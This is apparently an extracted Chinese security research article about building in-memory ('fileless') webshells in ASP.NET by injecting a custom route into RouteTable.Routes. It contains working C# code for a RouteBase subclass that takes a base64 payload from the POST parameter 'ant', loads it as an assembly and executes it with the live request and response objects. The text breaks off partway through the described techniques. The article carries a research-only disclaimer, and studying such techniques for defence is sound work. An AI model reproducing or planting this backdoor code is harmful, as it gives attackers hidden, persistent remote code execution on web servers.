1
ASP.NET下的内存⻢：Route内存⻢的N种写法
前⾔
System.Web.Routing
Route内存⻢
⾃⼰实现RouteBase
GetRouteData
GetVirtualPath
优先级
利⽤System.Web.Routing.Route
注⼊RouteHandler
注⼊HttpHandler
路由问题
添加到第⼀位
测试
参考
@yzddmr6 
asp.net下的内存⻢研究⽂章⽐较少，⽬前提到过的包括虚拟路径内存⻢以及HttpListener内存⻢。最近
研究了⼀下其他类型的内存⻢，发现.net可以利⽤的地⽅要多得多。所以准备写个系列⽂章，讲⼀讲
asp.net下的内存⻢。 
⽂章仅作研究性质，不保证任何实战效果，请勿⽤于⾮法⽤途。 
上篇讲了asp.net mvc下的filter内存⻢，必须依赖于system.web.mvc.dll这个东⻄，也就是只能在.net 
mvc下使⽤。那么如何仅利⽤.net framework⾥⾯的dll来实现新的内存⻢呢。这就引出了今天讲的route
内存⻢。 
System.Web.Routing这个类最早出现在.net 3.5，主要⽤于在 ASP.NET 应⽤程序中处理路由。 
前⾔ 
System.Web.Routing 
2
微软⽂档介绍： 
如果我们能够动态打进去⼀个路由，然后映射到我们⾃定义的类，即可实现内存⻢的效果。 
那么如何添加呢？我们上⼀篇⽂章看到了在mvc中是存在⼀个GlobalFilters.Filters来存放filter，第⼆个
RouteTable.Routes便是存放全局route的collection。 
这⾥提⼀嘴为啥不能直接⽤mvc下⾯的RouteConfig.RegisterRoutes来注册route 
点进函数可以看到调⽤了System.Web.Mvc.RouteCollectionExtensions.MapRoute⽅法，⽽这个⽅法
也是要依赖System.Web.Mvc.dll的。所以不能直接拿来⽤。 
Route内存⻢ 
C++
复制代码
Route类使你可以指定如何在 ASP.NET 应⽤程序中处理路由。 你 Route 为要映射到的每个 URL 
模式创建⼀个对象，该对象可以处理与该模式对应的请求。 然后，将路由添加到 Routes 集合。 当
应⽤程序收到请求时，ASP.NET 路由会循环访问集合中的路由， Routes 以查找第⼀个与 URL 模
式匹配的路由。
将 Url 属性设置为 URL 模式。 URL 模式由传⼊ HTTP 请求中的应⽤程序名称后⾯的段组成。 
例如，在 URL 中 http://www.contoso.com/products/show/beverages ，模式适⽤于 
products/show/beverages 。 具有三个段（如）的模式 {controller}/{action}/{id} 与 
URL 匹配 http://www.contoso.com/products/show/beverages 。 每个段均由 / 字符分
隔。 当段括在⼤括号中 ({ 和 }) 时，段会被称为 URL 参数。 ASP.NET 路由从请求中检索值并
将其分配给 URL 参数。 在上⾯的示例中，将为 URL 参数 action 分配值 show 。 如果段未括
在⼤括号中，则该值将被视为⽂本值。
将 Defaults 属性设置为⼀个 RouteValueDictionary 对象，该对象包含在 url 缺少参数时
使⽤的值，或者设置未在 url 中参数化的其他值。 将 Constraints 属性设置为 
RouteValueDictionary 包含正则表达式或对象的值的对象 IRouteConstraint 。 这些值⽤于
确定参数值是否有效。
1
2
3
4
5
C++
复制代码
    public class MvcApplication : System.Web.HttpApplication
    {
        protected void Application_Start()
        {
            AreaRegistration.RegisterAllAreas();
            FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
            RouteConfig.RegisterRoutes(RouteTable.Routes);
            BundleConfig.RegisterBundles(BundleTable.Bundles);
        }
    }
1
2
3
4
5
6
7
8
9
10
3
⼀路寻找重载，发现实际上就是给RouteTable.Routes⾥⾯增加了⼀个元素，我们直接调⽤route.Add即
可。 
System.Web.Routing.RouteCollection.Add第⼀个参数是名字，不过没有太⼤⽤处，只是为了判断map
⾥⾯有没有重复的。第⼆个参数是重点，要打进去⼀个RouteBase类型的item。RouteBase是个抽象
类，默认的实现为System.Web.Routing.Route。 
这⾥就有不同的操作⽅式了，第⼀种是⾃⼰实现⼀个RouteBase，第⼆种是new⼀个
System.Web.Routing.Route对象。 
⾃⼰实现RouteBase 
C++
复制代码
    public class RouteConfig
    {
        public static void RegisterRoutes(RouteCollection routes)
        {
            routes.IgnoreRoute("{resource}.axd/{*pathInfo}");
            routes.MapRoute(
                name: "Default",
                url: "{controller}/{action}/{id}",
                defaults: new { controller = "Home", action = "Index", id 
= UrlParameter.Optional }
            );
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
4
继承RouteBase需要实现两个⽅法： 
这个点是最容易想到的点，beichen师傅在kcon的演讲中也是⽤的这个函数。改写GetRouteData⽅法，
⾥⾯加⼊我们的shell逻辑即可。这⾥HttpContextBase是个抽象类，具体的实现是
HttpContextWrapper，需要⽤到反射来获取我们需要的request跟response。 
这⾥注意⼀定要加HttpResponse.End()，具体原因⼤家可以思考⼀下。 
GetRouteData 
GetRouteData(HttpContextBase) 
在派⽣类中重写时，返回关于请求的路由信息。 
GetVirtualPath(RequestContext, 
RouteValueDictionary) 
在派⽣类中重写时，检查路由是否与指定的值匹
配，如果匹配，则⽣成 URL，并检索有关该路由
的信息。 
5
后来⼜研究了⼀下beichen演讲的ppt，把ppt⾥⾯的代码⽤显微镜放⼤看，发现⾃⼰当时写的麻烦了。
直接⽤HttpContext.Current就可以获取当前的Context对象，传⼊Equals⾥即可，这是第⼀种写法。 
C++
复制代码
public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase 
httpContext)
        {
            String Payload = httpContext.Request.Form["ant"];
            if (Payload != null)
            {
                FieldInfo requestField =
                    typeof(HttpRequestWrapper).GetField("_httpRequest", 
BindingFlags.Instance | BindingFlags.NonPublic);
                HttpRequest httpRequest =
(HttpRequest)requestField.GetValue(httpContext.Request);
                FieldInfo responseField =
                    typeof(HttpResponseWrapper).GetField("_httpResponse",
                        BindingFlags.Instance | BindingFlags.NonPublic);
                HttpResponse httpResponse =
(HttpResponse)responseField.GetValue(httpContext.Response);
                System.Reflection.Assembly assembly = 
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + 
".Run").Equals(new object[] { httpRequest, httpResponse });
                httpResponse.End();
            }
            return null;
        }
        public override VirtualPathData GetVirtualPath(RequestContext 
requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
6
其实⽤GetVirtualPath也是可以注⼊我们的逻辑的，这是第⼆种写法。 
GetVirtualPath 
C++
复制代码
 public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase 
httpContext)
        {
            HttpContext context = HttpContext.Current;
            String Payload = httpContext.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = 
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + 
".Run").Equals(context);
                context.Response.End();
            }
            return null;
        }
        public override VirtualPathData GetVirtualPath(RequestContext 
requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }
1
2
3